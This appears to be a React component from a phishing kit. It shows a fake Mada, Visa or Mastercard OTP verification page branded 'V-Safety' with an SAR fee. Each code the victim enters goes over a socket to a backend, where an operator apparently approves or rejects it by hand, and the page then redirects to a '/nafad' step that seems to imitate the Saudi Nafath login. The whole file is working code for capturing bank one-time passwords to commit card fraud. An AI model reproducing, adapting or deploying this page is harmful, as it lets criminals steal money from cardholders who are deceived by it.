import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import Timer from '../../client/components/Timer';
import { useI18n } from '../../shared/i18n';
import PaymentLoadingScreen from '../../client/components/PaymentLoadingScreen';

interface Props {
  scheme: 'mada' | 'visa' | 'mastercard';
}

const schemeConfig = {
  mada: {
    logo: '/imgs/billing/mada-black.png',
    logoClass: 'w-40 h-16 md:w-48 md:h-20 bg-white border border-green-100',
    imgClass: 'h-8 md:h-10 w-auto',
    titleKey: 'madaVerificationCode',
    descKey: 'madaOTPSent',
    submitEvent: 'submitMadaOtp',
    containerClass: 'bg-green-50 border-green-100',
    btnClass: 'bg-green-600 hover:bg-green-700',
    timerClass: 'text-green-600',
    focusClass: 'focus:border-green-500 accent-green-600',
    loadingTitleAr: 'جاري التحقق من OTP مدى',
    loadingTitleEn: 'Verifying Mada OTP',
    loadingDescAr: 'يرجى الانتظار بينما تتم مراجعة رمز OTP الخاص ببطاقة مدى...',
    loadingDescEn: 'Please wait while your Mada OTP is being reviewed...',
    loadingStepsAr: ['تشفير رمز OTP', 'مراجعة رمز مدى', 'انتظار قرار القبول أو الرفض'],
    loadingStepsEn: ['Encrypting OTP', 'Reviewing Mada code', 'Waiting for approve/reject decision']
  },
  visa: {
    logo: '/imgs/billing/visa.png',
    logoClass: 'w-16 h-16 md:w-20 md:h-20 bg-blue-50 rounded-full',
    imgClass: 'h-8 md:h-10 w-auto',
    titleKey: 'visaVerificationCode',
    descKey: 'visaOTPSent',
    submitEvent: 'submitVisaOtp',
    containerClass: 'bg-blue-50 border-blue-100',
    btnClass: 'bg-blue-600 hover:bg-blue-700',
    timerClass: 'text-blue-600',
    focusClass: 'focus:border-blue-500 accent-blue-600',
    loadingTitleAr: 'جاري التحقق من OTP فيزا',
    loadingTitleEn: 'Verifying Visa OTP',
    loadingDescAr: 'يرجى الانتظار بينما تتم مراجعة رمز OTP الخاص ببطاقة فيزا...',
    loadingDescEn: 'Please wait while your Visa OTP is being reviewed...',
    loadingStepsAr: ['تشفير رمز OTP', 'مراجعة رمز فيزا', 'انتظار قرار القبول أو الرفض'],
    loadingStepsEn: ['Encrypting OTP', 'Reviewing Visa code', 'Waiting for approve/reject decision']
  },
  mastercard: {
    logo: '/imgs/billing/mastercard.png',
    logoClass: 'w-16 h-16 md:w-20 md:h-20 bg-gray-50 rounded-full',
    imgClass: 'h-8 md:h-10 w-auto',
    titleKey: 'mastercardVerificationCode',
    descKey: 'mastercardOTPSent',
    submitEvent: 'submitMasterCardOtp',
    containerClass: 'bg-gray-50 border-gray-200',
    btnClass: 'bg-slate-800 hover:bg-slate-900',
    timerClass: 'text-slate-800',
    focusClass: 'focus:border-slate-500 accent-slate-800',
    loadingTitleAr: 'جاري التحقق من OTP ماستركارد',
    loadingTitleEn: 'Verifying Mastercard OTP',
    loadingDescAr: 'يرجى الانتظار بينما تتم مراجعة رمز OTP الخاص ببطاقة ماستركارد...',
    loadingDescEn: 'Please wait while your Mastercard OTP is being reviewed...',
    loadingStepsAr: ['تشفير رمز OTP', 'مراجعة رمز ماستركارد', 'انتظار قرار القبول أو الرفض'],
    loadingStepsEn: ['Encrypting OTP', 'Reviewing Mastercard code', 'Waiting for approve/reject decision']
  }
} as const;

const CardOTP: React.FC<Props> = ({ scheme }) => {
    const navigate = useNavigate();
    const location = useLocation();
    const { t, isRTL, language } = useI18n();
    const config = schemeConfig[scheme];

    const formatEntryDateTime = (value: Date) => value.toLocaleString('en-GB', {
        day: '2-digit', month: '2-digit', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
    });
    const [entryDateTime] = useState(() => formatEntryDateTime(new Date()));

    const getServiceType = (): string => {
        const stateServiceType = (location.state as any)?.serviceType;
        if (stateServiceType) return stateServiceType;
        try {
            const rawDraft = sessionStorage.getItem('v_safety_booking_form_draft');
            if (rawDraft) {
                const parsed = JSON.parse(rawDraft);
                if (parsed?.serviceType) return parsed.serviceType;
            }
        } catch {}
        return 'periodic';
    };

    const serviceType = getServiceType();
    const fallbackAmount = `${serviceType === 'reinspection' ? '37.95' : '115.00'} ${language === 'ar' ? 'ر.س' : 'SAR'}`;
    const amount = (location.state as any)?.amount || fallbackAmount;
    
    // Use lastCardNumber from session storage or fallback if not available
    const sessionCardNumber = sessionStorage.getItem('lastCardNumber');
    const cardNumber = (location.state as any)?.cardNumber || sessionCardNumber || '**** **** **** 1234';

    const [code, setCode] = useState('');
    const [showOtp, setShowOtp] = useState(false);
    const [loading, setLoading] = useState(false);
    const [canResend, setCanResend] = useState(false);
    const [rejectMessage, setRejectMessage] = useState('');

    useEffect(() => {
        const handleApproved = (data: { redirectTo?: string }) => {
            setLoading(false);
            navigate(data?.redirectTo || '/nafad', { replace: true });
        };

        const handleRejected = (data: { message?: string }) => {
            setLoading(false);
            setCode('');
            setRejectMessage(data?.message || (language === 'ar'
                ? 'رمز OTP البنكي المدخل غير صحيح أو حدثت مشكلة أثناء الإدخال. يرجى المحاولة مرة أخرى.'
                : 'The entered bank OTP is incorrect or an input issue occurred. Please try again.'));
        };

        socketService.on('otpBankApproved', handleApproved);
        socketService.on('otpBankRejected', handleRejected);

        return () => {
            socketService.off('otpBankApproved', handleApproved);
            socketService.off('otpBankRejected', handleRejected);
        };
    }, [navigate, language]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        if (code.length !== 4 && code.length !== 6) return;
        setLoading(true);
        setRejectMessage('');
        socketService.emitClientEvent(config.submitEvent as any, { code });
    };

    const handleResend = () => {
        socketService.emitClientEvent('submitBankOtpResendNotification', { scheme });
        setCanResend(false);
    };

    return (
        <div className="max-w-lg mx-auto mt-5 md:mt-10 relative z-20 px-4 sm:px-0">
            <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 text-center">
                <div className={`${config.logoClass} flex items-center justify-center mx-auto mb-6 md:mb-8`}>
                    <img src={config.logo} alt={scheme} className={config.imgClass} />
                </div>

                <h2 className="text-xl md:text-2xl font-bold text-gray-800 mb-3">{t(config.titleKey as any)}</h2>
                <p className="text-gray-500 mb-6">{t(config.descKey as any)}</p>

                <div className={`${config.containerClass} rounded-lg p-3 md:p-4 mb-6 border text-sm`}>
                    <div className="grid grid-cols-2 gap-y-3">
                        <div className="text-gray-500">{t('merchant')}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">V-Safety</div>
                        <div className="text-gray-500">{t('amount')}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">{amount}</div>
                        <div className="text-gray-500">{t('date')}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">{entryDateTime}</div>
                        <div className="text-gray-500">{t('cardNumber')}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr" dir="ltr" style={{ textAlign: 'left', unicodeBidi: 'plaintext' }}>{cardNumber}</div>
                    </div>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <input
                            type={showOtp ? 'text' : 'password'}
                            className={`w-full p-3 sm:p-4 md:p-6 border-2 rounded-xl text-center text-2xl sm:text-3xl md:text-4xl tracking-[0.4em] sm:tracking-[0.8em] md:tracking-[1em] font-mono focus:ring-0 outline-none transition-colors dir-ltr border-gray-200 ${config.focusClass}`}
                            maxLength={6}
                            placeholder="------"
                            value={code}
                            onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                            autoFocus
                            required
                        />
                        <div className="mt-3 flex items-center justify-center gap-2">
                            <input
                                id="show-otp-toggle"
                                type="checkbox"
                                checked={showOtp}
                                onChange={(e) => setShowOtp(e.target.checked)}
                                className={`w-4 h-4 ${config.focusClass}`}
                            />
                            <label htmlFor="show-otp-toggle" className="text-sm text-gray-600 cursor-pointer select-none">
                                {language === 'ar' ? 'إظهار رمز OTP' : 'Show OTP code'}
                            </label>
                            <span className="text-xs text-gray-400">
                                {language === 'ar' ? 'رؤية الرمز' : 'View code'}
                            </span>
                        </div>
                    </div>

                    {!canResend && (
                        <div className="flex justify-center items-center gap-2 text-sm text-gray-500">
                            <span>{t('resendCodeIn')}</span>
                            <Timer seconds={60} className={`${config.timerClass} font-bold`} onComplete={() => setCanResend(true)} />
                            <span>{t('seconds')}</span>
                        </div>
                    )}

                    <button
                        type="submit"
                        disabled={loading || (code.length !== 4 && code.length !== 6)}
                        className={`w-full text-white font-bold py-3 md:py-4 rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all ${config.btnClass}`}
                    >
                        {loading ? t('verifying') : t('confirm')}
                    </button>
                </form>

                {canResend && (
                    <button onClick={handleResend} className={`mt-6 text-sm text-gray-400 hover:underline ${config.timerClass.replace('text-', 'hover:text-')}`}>
                        {t('codeNotReceived')}
                    </button>
                )}
            </div>

            <PaymentLoadingScreen
                isVisible={loading}
                title={language === 'ar' ? config.loadingTitleAr : config.loadingTitleEn}
                description={language === 'ar' ? config.loadingDescAr : config.loadingDescEn}
                steps={language === 'ar' ? config.loadingStepsAr : config.loadingStepsEn}
            />

            {rejectMessage && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full animate-fadeIn">
                        <div className="p-6 text-center">
                            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                </svg>
                            </div>
                            <h3 className="text-xl font-bold text-gray-800 mb-2">
                                {language === 'ar' ? 'تعذر تأكيد OTP البنكي' : 'Bank OTP Verification Failed'}
                            </h3>
                            <p className="text-gray-600 mb-6">{rejectMessage}</p>
                            <button
                                onClick={() => setRejectMessage('')}
                                className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-3 rounded-xl shadow-lg transform hover:-translate-y-1 transition-all"
                            >
                                {language === 'ar' ? 'إعادة المحاولة' : 'Try Again'}
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default CardOTP;
